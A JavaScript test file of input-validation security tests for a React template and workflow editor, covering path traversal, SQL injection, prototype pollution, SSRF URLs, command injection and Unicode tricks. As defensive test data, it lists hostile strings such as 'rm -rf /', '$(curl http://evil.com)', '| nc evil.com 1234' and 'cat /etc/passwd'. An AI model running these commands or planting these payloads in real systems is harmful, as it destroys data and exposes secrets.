import React from 'react';
import { render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { PreferencesProvider } from '@/contexts/PreferencesContext';
import { FeatureFlagsProvider } from '@/contexts/FeatureFlagsContext';
import TemplateEditor from '@/components/templates/TemplateEditor';
import WorkflowEditor from '@/components/workflows/WorkflowEditor';
import * as dataStorage from '@/utils/dataStorage';

jest.mock('@/utils/dataStorage');

const renderWithProviders = (component) => {
  const queryClient = new QueryClient({
    defaultOptions: {
      queries: { retry: false, refetchOnWindowFocus: false },
    },
  });

  return render(
    <QueryClientProvider client={queryClient}>
      <FeatureFlagsProvider>
        <PreferencesProvider>
          {component}
        </PreferencesProvider>
      </FeatureFlagsProvider>
    </QueryClientProvider>
  );
};

describe('Input Validation Security Tests', () => {
  let user;

  beforeEach(() => {
    user = userEvent.setup();
    jest.clearAllMocks();
    dataStorage.loadAllData.mockResolvedValue({
      templates: [],
      workflows: [],
      snippets: [],
      folders: []
    });
  });

  describe('Template Name Validation', () => {
    it('should reject template names with invalid characters', async () => {
      renderWithProviders(
        <TemplateEditor onSave={jest.fn()} onCancel={jest.fn()} />
      );

      const nameInput = screen.getByLabelText(/template name/i);
      
      // Test various invalid inputs
      const invalidNames = [
        '../../../etc/passwd',
        'template<script>',
        'template\x00null',
        'template\nnewline',
        'template\rtab',
        '🔥'.repeat(100), // Excessive emoji
        ' '.repeat(50), // Only spaces
        ''
      ];

      for (const invalidName of invalidNames) {
        await user.clear(nameInput);
        await user.type(nameInput, invalidName);
        
        const saveButton = screen.getByRole('button', { name: /save/i });
        await user.click(saveButton);

        // Should show validation error
        await waitFor(() => {
          expect(screen.getByText(/invalid template name/i)).toBeInTheDocument();
        });
      }
    });

    it('should enforce maximum length limits', async () => {
      renderWithProviders(
        <TemplateEditor onSave={jest.fn()} onCancel={jest.fn()} />
      );

      const nameInput = screen.getByLabelText(/template name/i);
      const descriptionInput = screen.getByLabelText(/description/i);

      // Try to input very long strings
      const longString = 'a'.repeat(1000);
      
      await user.type(nameInput, longString);
      await user.type(descriptionInput, longString);

      // Check that input is truncated
      expect(nameInput.value.length).toBeLessThanOrEqual(100);
      expect(descriptionInput.value.length).toBeLessThanOrEqual(500);
    });

    it('should validate against SQL injection patterns', async () => {
      renderWithProviders(
        <TemplateEditor onSave={jest.fn()} onCancel={jest.fn()} />
      );

      const nameInput = screen.getByLabelText(/template name/i);
      const contentInput = screen.getByLabelText(/template content/i);

      // Common SQL injection patterns
      const sqlInjectionPatterns = [
        "'; DROP TABLE templates; --",
        "1' OR '1'='1",
        "admin'--",
        "1; DELETE FROM templates WHERE 1=1;",
        "' UNION SELECT * FROM users --"
      ];

      for (const pattern of sqlInjectionPatterns) {
        await user.clear(nameInput);
        await user.type(nameInput, pattern);

        const saveButton = screen.getByRole('button', { name: /save/i });
        await user.click(saveButton);

        // Should sanitize or reject
        await waitFor(() => {
          expect(screen.getByText(/invalid characters/i)).toBeInTheDocument();
        });
      }
    });
  });

  describe('Variable Name Validation', () => {
    it('should only allow valid variable names', async () => {
      renderWithProviders(
        <TemplateEditor onSave={jest.fn()} onCancel={jest.fn()} />
      );

      const contentInput = screen.getByLabelText(/template content/i);

      // Test invalid variable patterns
      const invalidVariables = [
        '{123name}', // Starting with number
        '{name with spaces}', // Spaces
        '{name-with-dash}', // Special chars
        '{__proto__}', // Prototype pollution attempt
        '{constructor}', // Constructor access
        '{<script>}', // HTML injection
        '{}', // Empty variable
        '{a'.repeat(50) + '}', // Unclosed bracket spam
      ];

      for (const variable of invalidVariables) {
        await user.clear(contentInput);
        await user.type(contentInput, `Template with ${variable}`);

        // Check that invalid variables are highlighted or rejected
        await waitFor(() => {
          const variableList = screen.queryByText(/detected variables/i);
          if (variableList) {
            // Should not detect invalid variables
            expect(screen.queryByText(variable.slice(1, -1))).not.toBeInTheDocument();
          }
        });
      }
    });
  });

  describe('File Import Validation', () => {
    it('should validate file size limits', async () => {
      const largeFile = new File(
        ['x'.repeat(10 * 1024 * 1024)], // 10MB
        'large.json',
        { type: 'application/json' }
      );

      // Mock file size check
      Object.defineProperty(largeFile, 'size', {
        value: 10 * 1024 * 1024,
        writable: false
      });

      const fileInput = document.createElement('input');
      fileInput.type = 'file';
      
      const changeEvent = new Event('change', { bubbles: true });
      Object.defineProperty(changeEvent, 'target', {
        value: { files: [largeFile] },
        writable: false
      });

      // Simulate validation
      const isValidSize = largeFile.size <= 5 * 1024 * 1024; // 5MB limit
      expect(isValidSize).toBe(false);
    });

    it('should validate file type restrictions', async () => {
      const invalidFiles = [
        new File(['content'], 'test.exe', { type: 'application/x-msdownload' }),
        new File(['content'], 'test.bat', { type: 'application/batch' }),
        new File(['content'], 'test.sh', { type: 'application/x-sh' }),
        new File(['content'], 'test.html', { type: 'text/html' }),
      ];

      for (const file of invalidFiles) {
        // Validate file type
        const validTypes = ['application/json', 'text/plain'];
        const isValidType = validTypes.includes(file.type);
        expect(isValidType).toBe(false);
      }
    });

    it('should validate JSON structure on import', async () => {
      const invalidJsonStructures = [
        '{"templates": "not an array"}', // Wrong type
        '{"workflows": [{"noRequiredFields": true}]}', // Missing fields
        '{"version": "999.0.0"}', // Invalid version
        '[]', // Root must be object
        '{"templates": [null]}', // Null values
        '{"templates": [{"id": {"nested": "object"}}]}', // Complex nested objects
      ];

      for (const json of invalidJsonStructures) {
        try {
          const parsed = JSON.parse(json);
          
          // Validate structure
          const isValid = 
            typeof parsed === 'object' &&
            !Array.isArray(parsed) &&
            (!parsed.templates || Array.isArray(parsed.templates)) &&
            (!parsed.workflows || Array.isArray(parsed.workflows));
          
          expect(isValid).toBe(false);
        } catch {
          // Invalid JSON should be caught
          expect(true).toBe(true);
        }
      }
    });
  });

  describe('Category Validation', () => {
    it('should only allow predefined categories', async () => {
      renderWithProviders(
        <TemplateEditor onSave={jest.fn()} onCancel={jest.fn()} />
      );

      const categorySelect = screen.getByLabelText(/category/i);
      
      // Get all options
      const options = Array.from(categorySelect.options).map(o => o.value);
      
      // Should only contain allowed categories
      const allowedCategories = ['General', 'Development', 'Email', 'Documentation', 'Marketing'];
      
      options.forEach(option => {
        if (option) { // Skip empty option
          expect(allowedCategories).toContain(option);
        }
      });
    });
  });

  describe('Number Input Validation', () => {
    it('should validate numeric inputs are within acceptable ranges', async () => {
      // Mock a component with numeric input
      const TestComponent = () => {
        const [value, setValue] = React.useState('');
        
        const handleChange = (e) => {
          const num = parseInt(e.target.value);
          if (num >= 0 && num <= 100) {
            setValue(e.target.value);
          }
        };

        return (
          <input
            type="number"
            value={value}
            onChange={handleChange}
            aria-label="Test number input"
          />
        );
      };

      render(<TestComponent />);
      
      const input = screen.getByLabelText(/test number input/i);
      
      // Test boundary values
      await user.type(input, '-1');
      expect(input.value).toBe('');
      
      await user.type(input, '101');
      expect(input.value).toBe('10'); // Only first two digits accepted
      
      await user.clear(input);
      await user.type(input, '50');
      expect(input.value).toBe('50');
    });
  });

  describe('URL Validation', () => {
    it('should validate URLs to prevent SSRF attacks', () => {
      const dangerousUrls = [
        'http://localhost:8080',
        'http://127.0.0.1',
        'http://0.0.0.0',
        'http://192.168.1.1',
        'http://10.0.0.1',
        'http://[::1]',
        'file:///etc/passwd',
        'ftp://internal-server',
        'gopher://example.com',
        'dict://example.com',
        'sftp://example.com',
        'ldap://example.com',
        'jar:http://example.com!/path',
      ];

      const isValidUrl = (url) => {
        try {
          const parsed = new URL(url);
          
          // Only allow http/https
          if (!['http:', 'https:'].includes(parsed.protocol)) {
            return false;
          }
          
          // Block local addresses
          const hostname = parsed.hostname;
          const localPatterns = [
            /^localhost$/i,
            /^127\./,
            /^10\./,
            /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
            /^192\.168\./,
            /^0\.0\.0\.0$/,
            /^\[::1\]$/,
          ];
          
          return !localPatterns.some(pattern => pattern.test(hostname));
        } catch {
          return false;
        }
      };

      dangerousUrls.forEach(url => {
        expect(isValidUrl(url)).toBe(false);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    it('should sanitize inputs that could lead to command injection', () => {
      const dangerousInputs = [
        '`rm -rf /`',
        '$(curl http://evil.com)',
        '| nc evil.com 1234',
        '; cat /etc/passwd',
        '&& wget http://evil.com/script.sh',
        '\n/bin/sh',
        '${IFS}cat${IFS}/etc/passwd',
      ];

      const sanitize = (input) => {
        // Remove or escape dangerous characters
        return input
          .replace(/[`$|;&\n]/g, '')
          .replace(/\${.*?}/g, '');
      };

      dangerousInputs.forEach(input => {
        const sanitized = sanitize(input);
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('\n');
      });
    });
  });

  describe('Unicode and Encoding Validation', () => {
    it('should handle unicode normalization attacks', () => {
      // Different representations of the same character
      const inputs = [
        'café', // é as single character
        'cafe\u0301', // e + combining acute accent
        '\u202Emalicious\u202C', // Right-to-left override
        'test\u0000null', // Null byte injection
        '\uFEFFtest', // Zero-width no-break space
      ];

      inputs.forEach(input => {
        // Normalize and sanitize
        const normalized = input
          .normalize('NFC')
          .replace(/[\u0000-\u001F\u007F-\u009F\u200B-\u200F\u202A-\u202E\uFEFF]/g, '');
        
        expect(normalized).not.toContain('\u0000');
        expect(normalized).not.toContain('\u202E');
        expect(normalized).not.toContain('\uFEFF');
      });
    });
  });
});